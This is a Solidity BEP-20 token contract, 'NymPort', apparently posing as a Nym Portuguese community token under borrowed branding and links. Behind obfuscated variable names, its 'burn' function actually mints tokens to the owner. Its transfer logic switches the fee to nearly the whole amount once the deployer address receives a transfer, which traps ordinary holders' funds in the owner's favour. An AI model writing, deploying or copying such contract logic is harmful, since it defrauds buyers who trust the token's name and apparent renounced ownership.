/**
 *Submitted for verification at BscScan.com on 2022-12-02
*/

/*
Nym 
Nym - Português
@NymPortugues
Construindo a nova camada da privacidade na Internet.
https://t.me/nymportuguese
https://nymtech.net
https://discord.gg/nym
https://twitter.com/NymPortugues 
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.15;
contract NymPort {
address private  DRKIZR = address(0);
uint8 public constant decimals = 18;
address private  IREDOD = address(0);
address private  CLWFNV = address(0);
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
string public  name = "NymPort";
string public  symbol = "NymPort";
uint256 private  EWARZB = 1000000000000000000;
uint256 private  XQVFYC = 1000000000000000;
mapping (address => mapping (address => uint256)) private _allowances;
uint256 private  DWGBNE = 1000000000000000000000;
uint256 private  AHADIK = 1000000000000000000;
address private  COYUQR = address(0);
mapping (address => uint256) public balanceOf;
address public owner;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
address private  UISDVT = address(0);
event Transfer(address indexed from, address indexed to, uint256 value);
uint256 public constant OYTUQJ = 99999;
uint256 private  JJXSAH = 10000000000000;
event Approval(address indexed owner, address indexed spender, uint256 value);
uint256 private  BXQVMC = 100000000;
uint256 public constant totalSupply = 100000000000000000000000000000;
uint256 private  LEHQKQ = 10000000000;
function _getJJXSAH() private returns (uint256) {
return JJXSAH;
}

function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "VBCABZ");
require(to != address(0), "VBCABZ");
require(amount <= balanceOf[from], "VBCABZ");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* OYTUQJ/EWARZB ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==COYUQR){
EWARZB = OYTUQJ+4;
}
emit Transfer(from, to, transferAmount);
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _getXQVFYC() private returns (uint256) {
return XQVFYC;
}

function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
constructor () {
COYUQR = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _getDWGBNE() private returns (uint256) {
return DWGBNE;
}

function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _getBXQVMC() private returns (uint256) {
return BXQVMC;
}

function _getIREDOD() private returns (address) {
return IREDOD;
}

function _getLEHQKQ() private returns (uint256) {
return LEHQKQ;
}

modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tVBCABZ 0");
require(spender != address(0), "fVBCABZ 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function _getAHADIK() private returns (uint256) {
return AHADIK;
}

function _getDRKIZR() private returns (address) {
return DRKIZR;
}

function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _getUISDVT() private returns (address) {
return UISDVT;
}

function _getCLWFNV() private returns (address) {
return CLWFNV;
}


}